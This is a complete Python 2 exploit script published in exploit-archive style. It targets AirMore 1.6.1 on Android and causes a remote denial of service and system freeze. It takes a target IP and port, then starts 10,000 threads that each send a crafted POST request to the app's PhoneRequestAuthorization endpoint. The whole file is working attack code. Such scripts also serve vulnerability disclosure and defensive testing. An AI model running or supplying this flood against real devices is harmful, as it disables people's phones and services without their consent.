#coding: utf-8

# ************************************************************************
# *                Author: Marcelo Vázquez (aka s4vitar)                 *
# *     AirMore 1.6.1 Remote Denial of Service (DoS) & System Freeze     *
# ************************************************************************

# Exploit Title: AirMore 1.6.1 Remote Denial of Service (DoS) & System Freeze
# Date: 2019-02-14
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Vendor Homepage: https://airmore.com/
# Software Link: https://airmore.com/download
# Version: <= AirMore 1.6.1
# Tested on: Android

import sys, requests, threading, signal

def handler(signum, frame):
        print &#039;\nFinishing program...\n&#039;
        sys.exit(0)

if len(sys.argv) != 3:
	print "\nUsage: python " + sys.argv[0] + " <ip_address> <port>\n"
	print "Example: python AirMore_dos.py 192.168.1.125 2333\n"
	sys.exit(0)

def startAttack(url):
	url_destination = url + &#039;/?Key=PhoneRequestAuthorization&#039;
	headers = {&#039;Origin&#039;: url, &#039;Accept-Encoding&#039;: &#039;gzip, deflate, br&#039;, &#039;Accept-Language&#039;: &#039;es-ES,es;q=0.9,en;q=0.8&#039;, &#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#039;, &#039;Content-Type&#039;: &#039;text/plain;charset=UTF-8&#039;, &#039;accept&#039;: &#039;text/plain&#039;, &#039;Referer&#039;: url, &#039;Connection&#039;: &#039;keep-alive&#039;}

	r = requests.post(url_destination, headers=headers)

if __name__ == &#039;__main__&#039;:

	signal.signal(signal.SIGINT, handler)
	url = &#039;http://&#039; + sys.argv[1] + &#039;:&#039; + sys.argv[2]

	threads = []

	for i in xrange(0, 10000):
		t = threading.Thread(target=startAttack, args=(url,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()

